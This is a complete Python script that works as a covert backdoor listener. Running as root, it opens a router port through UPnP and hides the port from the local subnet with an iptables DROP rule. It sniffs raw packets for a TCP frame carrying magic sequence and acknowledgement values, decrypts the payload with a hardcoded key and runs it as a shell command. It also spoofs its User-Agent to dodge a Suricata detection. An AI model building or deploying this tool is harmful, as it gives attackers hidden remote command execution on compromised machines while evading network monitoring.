#!/usr/bin/python3

import upnpy
import netifaces
from scapy.all import Ether, IP, TCP, send

from cryptography.fernet import Fernet
from random import randint
from time import sleep

import ipaddress
import socket
import argparse
import sys
import os
import errno
import fcntl
import subprocess

def get_interface(ip):
        interfaces = netifaces.interfaces()
        for interface in interfaces:
            addresses = netifaces.ifaddresses(interface)
            if netifaces.AF_INET in addresses:
                for address_info in addresses[netifaces.AF_INET]:
                    if 'addr' in address_info and address_info['addr'] == ip:
                        return interface
        return None  # If the IP address is not found on any interface

def get_cidr(ip, interface):
    # Interfaces can have more than 1 address
    addrs = netifaces.ifaddresses(interface)
    mask = None
    if netifaces.AF_INET in addrs:
        for addr_info in addrs[netifaces.AF_INET]:
            if 'netmask' in addr_info:
                mask = addr_info['netmask']
    elif netifaces.AF_INET6 in addrs:
        for addr_info in addrs[netifaces.AF_INET6]:
            if 'netmask' in addr_info:
                mask = addr_info['netmask']

    if not mask:
        raise ValueError("Subnet Mask was None")

    cidr = ipaddress.IPv4Network(f"{ip}/{mask}", strict=False)
    return cidr

def get_internal_ip(igd_ip):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((igd_ip, 0))
        internal_ip = s.getsockname()[0]
        return internal_ip

# Function to decrypt binary data with the AES key
def decrypt_with_aes_key(key, encrypted_data):
    fernet = Fernet(key)
    decrypted_data = fernet.decrypt(encrypted_data)
    return decrypted_data

# TCP Frame Utils
def capture_tcp_frame(interface, port):
    # Create a socket to capture packets
    sniffer = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
    sniffer.bind((interface, 0))

    try:
        while True:
            raw_packet, _ = sniffer.recvfrom(65535)  # Capture a packet          
            packet = Ether(raw_packet)

            # Check if it's an IP packet and has a TCP layer
            if IP in packet and TCP in packet:
                ip_packet = packet[IP]
                tcp_frame = packet[TCP]

                # Check if it's a TCP frame with the desired destination port
                if tcp_frame.dport == port:
                    sniffer.close()
                    return tcp_frame

    except KeyboardInterrupt:
        sniffer.close()
        raise KeyboardInterrupt

class Bash_Command:
    def __init__(self, cmd):
        self.command = cmd
        self.stdout = ''
        self.stderr = ''

    def run(self):
        def set_fd_nonblocking(fd):
            flags = fcntl.fcntl(fd, fcntl.F_GETFL)
            fcntl.fcntl(fd, fcntl.F_SETFL, flags | os.O_NONBLOCK)

        def read_nonblocking(fd, block_size):
            try:
                return os.read(fd.fileno(), block_size)
            except OSError as e:
                if e.errno != errno.EAGAIN:
                    raise
                return b''
        
        p = subprocess.Popen(self.command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        set_fd_nonblocking(p.stdout)
        set_fd_nonblocking(p.stderr)

        # BLOCK_SIZE: Size of read buffer in to memory
        # The larger this is, the faster the command runs
        BLOCK_SIZE = 1048576
        executing = True

        p.poll()
        while (p.returncode is None):
            stdout_data = read_nonblocking(p.stdout, BLOCK_SIZE)
            stderr_data = read_nonblocking(p.stderr, BLOCK_SIZE)
            if stdout_data:
                self.stdout += stdout_data.decode('utf-8')
            if stderr_data:
                self.stderr += stderr_data.decode('utf-8')
            p.poll()
            sleep(1)
        sleep(1) # Give time for output to flush

        while True:
            stdout_data = read_nonblocking(p.stdout, BLOCK_SIZE)
            stderr_data = read_nonblocking(p.stderr, BLOCK_SIZE)
            if not stdout_data and not stderr_data:
                break
            if stdout_data:
                self.stdout += stdout_data.decode('utf-8', 'ignore')
            if stderr_data:
                self.stderr += stderr_data.decode('utf-8', 'ignore')
        return self

class UPnP_Manager:
    def __init__(self, port):
        self.port = port
        self.upnp = upnpy.UPnP()
        self.igd = None
        self.internal_ip = None
        self.interface = None

    def update_network_info(self):
        self.upnp = upnpy.UPnP()
        self.upnp.discover()
        self.igd = self.upnp.get_igd()
        self.internal_ip = get_internal_ip(self.igd.host)
        self.interface = get_interface(self.internal_ip)
    
    def get_machine_network_info(self):
        return self.interface, self.internal_ip, self.port 

    def open_upnp(self):
        self.igd['WANIPConn1'].AddPortMapping(
            NewRemoteHost='',
            NewExternalPort=self.port,
            NewProtocol='TCP',
            NewInternalPort=self.port,
            NewInternalClient=self.internal_ip,
            NewEnabled=1,
            NewPortMappingDescription='',
            NewLeaseDuration=0,
        )

    def close_upnp(self):
        self.igd['WANIPConn1'].DeletePortMapping(
            NewRemoteHost='',
            NewExternalPort=self.port,
            NewProtocol='TCP',
        )

    def get_upnp_entry(self):
        entry = self.igd['WANIPConn1'].GetSpecificPortMappingEntry(
            NewRemoteHost='',
            NewExternalPort=self.port,
            NewProtocol='TCP',
        )
        return entry

if __name__ == "__main__":
    script_name = sys.argv[0].split('/')[-1]

    def check_sudo():
        if os.geteuid() != 0:
            print(f"{script_name}: error: You need superuser privileges to run this script.")
            exit(1)
    check_sudo()

    # Create the argument parser
    parser = argparse.ArgumentParser(description="Sample script with custom command-line arguments")
    parser.add_argument("-p", "--port", type=int, help="Specify the port", required=True)
    parser.add_argument("--no-upnp", action="store_true", help="Do not attempt to use UPnP")
    parser.add_argument("--no-drop", action="store_true", help="Do not try to use iptables to drop packets")
    parser.add_argument("--lo", action="store_true", help="Use loopback as interface (debug/testing)")
    args = parser.parse_args()

    #-------------------------------------------------
    # A quick monkey patch to change the User-Agent header
    # that was tagged by Suricata (Python-urllib)
    # https://github.com/5kyc0d3r/upnpy/blob/master/upnpy/utils.py
    import urllib
    def monkey(url, data=None, headers=None):
        if not headers:
            headers = {}
        headers['User-Agent'] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
        request = urllib.request.Request(url, data=data, headers=headers)
        return urllib.request.urlopen(request)
    upnpy.utils.make_http_request = monkey
    #-------------------------------------------------
    
    key = b'Au_dVY1CKhFgaK4RW1kUPpJm_JqYqV7cOJej5tSFVUk='
    netman = UPnP_Manager(args.port)
    netman.update_network_info()

    if not args.no_upnp:
        netman.open_upnp()

    if args.lo:
        netman.interface = 'lo'
        netman.internal_ip = '127.0.0.1'

    ip = netman.internal_ip
    interface, host, port = netman.get_machine_network_info()

    if not args.no_drop:
        cidr = get_cidr(ip, interface)
        is_rule = True
        ipt_cmd = Bash_Command(f"iptables -C INPUT -s {cidr} -p tcp --dport {args.port} -j DROP").run()
        if "Bad rule" in ipt_cmd.stderr:
            is_rule = False
            t = Bash_Command(f"iptables -A INPUT -s {cidr} -p tcp --dport {args.port} -j DROP").run()
    
    print(f"[\033[92m+\033[0m] Server running ({interface}:{port})...")
    
    key_seq = 1736489045
    key_ack = 3307312975
    key_flags = 'PA'

    try:
        while True:
            p = capture_tcp_frame(interface, port)
            if p.seq == key_seq and p.ack == key_ack and p.flags == key_flags:
                command = decrypt_with_aes_key(key, p.load).decode('utf-8')
                print(f'[\033[92m+\033[0m] Command Issued: {command}')
                c = Bash_Command(command).run()
                print(f"STDOUT:\n {c.stdout}")
                print(f"STDERR:\n {c.stderr}")

    except Exception as e:
        print(f'[\033[91m-\033[0m] Exception: {e}')
    except KeyboardInterrupt:
        print('\n[\033[94m*\033[0m] Server interrupted. Closing gracefully...')
    finally:
        if not args.no_upnp:
            netman.close_upnp()
        if not args.no_drop and not is_rule:
            Bash_Command(f"iptables -D INPUT -s {cidr} -p tcp --dport {args.port} -j DROP").run()